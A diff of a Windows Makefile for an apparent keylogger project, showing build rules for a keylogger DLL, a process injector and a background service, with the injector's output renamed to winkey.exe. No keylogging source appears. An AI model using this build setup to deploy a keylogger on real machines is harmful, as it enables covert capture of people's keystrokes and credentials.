@@ -12,7 +12,7 @@ winkey.exe: $(SRCS) keylog\exemain.c
 	cl $(FLAGS) /Fe$@ $** $(RES_FILE) user32.lib psapi.lib
 
 svc.exe: service\svc.cpp
-	$(CC) $(FLAGS) /Fe$@ $**
+	$(CC) $(FLAGS) -I keylog /Fe$@ $** user32.lib advapi32.lib wtsapi32.lib
 
 bonus: keylogger.dll injector.exe
 
@@ -20,7 +20,8 @@ keylogger.dll: keylog/keylogger.c keylog/init_logger.c keylog/sys_getter.c keylo
 	cl /LD $(FLAGS) keylog\keylogger.c keylog\init_logger.c keylog\sys_getter.c keylog\dllmain.c /link user32.lib /Fe:keylogger.dll
 
 injector.exe: keylog/injector.c $(RES_FILE)
-	cl $(FLAGS) keylog\injector.c $(RES_FILE) user32.lib psapi.lib /Fe:injector.exe
+	cl $(FLAGS) keylog\injector.c $(RES_FILE) user32.lib psapi.lib /Fe:winkey.exe
+
 clean:
 	del /Q *.obj 2>nul
 
